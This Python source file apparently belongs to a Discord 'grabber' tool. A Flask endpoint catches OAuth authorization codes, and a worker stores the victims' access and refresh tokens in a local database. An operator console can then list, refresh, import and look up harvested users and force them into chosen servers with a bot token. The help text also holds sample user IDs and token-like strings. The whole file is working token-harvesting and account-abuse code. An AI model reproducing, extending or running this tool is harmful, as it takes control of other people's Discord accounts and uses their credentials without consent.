import requests
import os.path
import socket
import logging
import time
from configparser import ConfigParser
from flask import Flask, render_template, request
from threading import Thread
import oauth as worker
app = Flask(__name__)
flasLogger = logging.getLogger('werkzeug')
flasLogger.setLevel(logging.ERROR)
config = ConfigParser()
configPath = 'resources/config.ini'
dbPath = 'resources/db.json'

Threads = []


try:    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    LOCAL_IP = s.getsockname()[0]
    EXTERNAL_IP = requests.get('https://api.ipify.org').content.decode('utf8')
    s.close()
except Exception as err:
    print('Error while getting ips! Exiting! Error: ', err)
    print('Error while getting ips! Check your internet connection! Exiting!')
    exit()

if(os.path.exists(configPath)):
    print('config file exist')
    config.read(configPath)
else:
    print('config file doesn\'t exist! creating, you have to enter some values!')
    a = input("Discord client id: ")
    b = input("Discord client secret: ")
    while(True):
        c = input("Discord api url(https://discord.com/api/v10): ")
        if(c == ''):
            c = 'https://discord.com/api/v10'
            break
        if(c.startswith("https://discord.com/api/")):
            break
        else:
            print('incorrect url')
    while(True):
        d = input("Port(3000) 1024-32766: ")
        if(d == ''):
            d = 3000
        try:
            ret = int(d)
            if(ret>=1024 and ret<=32767):
                break
            else:
                print("incorrect port number! pls enter number in 1024-32766")
        except ValueError:
            print('You have not entered a number!')
    while(True):
        e = input('redirect url *generated exactly for you*(%s): ' % 'http://%s:' % EXTERNAL_IP)
        if(e == ''):
            e = 'http://%s:' % EXTERNAL_IP
            break
        if(e.startswith('http')):
            break
        else:
            print('incorrect url! please enter http(https) url!')
    while(True):
        f = input("Url path(/api/auth/discord/redirect): ")
        if(f == ''):
            f = "/api/auth/discord/redirect"
            break
        if(f == '/'):
            print('incorrect path! must be more then just "/"')
        elif(f.startswith('/')):
            break
        else:
            print('incorrect path! must start with /')
    
    config['discord'] = {'client_id': a,
                         'client_secret': b,
                         'api': c}
    config['grabber'] = {'port': d,
                         'redirect_uri': e,
                         'grabber_url_args': f}
    print('Your redirect url:"%s"' % e+d+f)
    print('writing config file in %s' % configPath)
    with open(configPath, 'w') as conf:
        config.write(conf)
        print('writed config file in %s' % configPath)

API_ENDPOINT = config['discord']['api']
CLIENT_ID = config['discord']['client_id']
CLIENT_SECRET = config['discord']['client_secret']
PORT = config['grabber']['port']
URL_ARGS = config['grabber']['grabber_url_args']
REDIRECT_URI = config['grabber']['redirect_uri'] + PORT + URL_ARGS

worker.API_ENDPOINT = API_ENDPOINT
worker.CLIENT_ID = CLIENT_ID
worker.CLIENT_SECRET = CLIENT_SECRET
worker.REDIRECT_URI = REDIRECT_URI

@app.route("/")
def home():
    return render_template('home.html')

@app.route(URL_ARGS)
async def login():
    if (request.args.__contains__('code')):
        code = request.args['code']
        i = Threads.__len__()
        Threads.append(Thread(target=worker.Code_catch, args=(code, i,), daemon=True))
        Threads[i].start()
        return 'hi!'

def web():
    app.run(debug = False, port=PORT,host=LOCAL_IP)


Threads.append(Thread(target=web, args={}, daemon=True))
Threads[0].start()

#CLI
time.sleep(1.0)
while(True):
    command = input('~: ')
    cwa = command.split(' ')
    cmd = cwa[0]
    match(cmd):
        case 'help':
            print('Command list:\n\thelp - show this list\n\texamples - show examples for all commands\n\tdebug - control theards debug\n\tusers - shows users\n\tbyName <username> - get user from db by username!\n\tbyId <user_id> - get user from db by id!\n\tupdate <user_id> - update info and tokens of user\n\tjoinGuild <user_id> <server_id> <bot_token> - add user from db to a server with bot!\n\tadd <refresh_token> - add new user to db by refresh token')
        case 'debug':
            if(cwa.__len__() == 1):
                if(worker.debug):
                    print('Debug is turned off')
                else:
                    print('Debug is turned on')
                worker.debug = not worker.debug
            else:
                print('Incorrect args amount! Use "help"')
        case 'users':
            if(cwa.__len__() == 1):
                worker.GetUsers()
            else:
                print('Incorrect args amount!')
        case 'byName':
            if(cwa.__len__() == 2):
                worker.dbWorker.show(worker.dbWorker.getByName(cwa[1]))
            else:
                print('Incorrect args amount!')
        case 'byId':
            if(cwa.__len__() == 2):
                worker.dbWorker.show(worker.dbWorker.getById(cwa[1]))
            else:
                print('Incorrect args amount!')
        case 'update':
            if(cwa.__len__() == 2):
                worker.Update(cwa[1])
            else:
                print('Incorrect args amount!')
        case 'joinGuild':
            if(cwa.__len__() == 4):
                worker.Joiner(cwa[3], cwa[2], cwa[1])
            else:
                print('Incorrect args amount!')
        case 'add':
            if(cwa.__len__() == 2):
                worker.Add(cwa[1], 0)
            else:
                print('Incorrect args amount! Use "help"')
        case 'examples':
            print('Examples:\n\tdebug:\n\t debug\n\tusers:\n\t users\n\tbyName:\n\t byName possiug\n\tbyId:\n\t byId 1100792963157737602\n\tupdate:\n\t update 1100792963157737602\n\t update -1\n\t update 1161570973993156620,1078923883899535420\n\tjoinGuild:\n\t joinGuild 1100792963157737602 1161570973993156620 DJmdSFjLDis.G1Khh0.FJSLjGHSyiD234jh\n\t joinGuild 1161570973993156620,1078923883899535420 1161570973993156620,1145744998453743706 DJmdSFjLDis.G1Khh0.FJSLjGHSyiD234jh\n\t joinGuild -1 1161570973993156620,1145744998453743706 DJmdSFjLDis.G1Khh0.FJSLjGHSyiD234jh\n\tadd:\n\t add r6CR0RbIJuJI2c0P7JB1VGtCW5WvrJ\n\t add r6CR0RbIJuJI2c0P7JB1VGtCW5WvrJ,OkL80QmDDUKZiPgsxw3bWaeqs0BwuW')
        case _:
            print('Command not found! use "help" for list of commands')